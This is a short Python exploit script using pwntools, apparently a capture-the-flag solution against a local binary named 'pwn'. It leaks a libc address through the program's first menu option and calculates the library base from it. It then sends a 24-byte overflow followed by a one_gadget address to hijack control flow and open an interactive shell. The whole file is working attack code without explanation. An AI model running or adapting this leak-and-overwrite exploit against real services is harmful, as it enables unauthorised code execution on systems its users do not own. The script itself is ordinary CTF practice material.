from pwn import *

r=process('./pwn')
libc=ELF('./libc.so.6')

context.terminal=['tmux','splitw','-h']

r.recvuntil("===========")
r.sendline(b'1')

r.recvline()
libc_base = u64(r.recv(6).ljust(8,b'\x00'))-libc.symbols['puts']
print(hex(libc_base))

# gdb.attach(r,'b vuln')

r.recvuntil("===========")
r.sendline(b'2')

r.recvuntil(b'tell me something\n')
r.sendline(b'a'*0x18+p64(libc_base+0x45226))



r.interactive()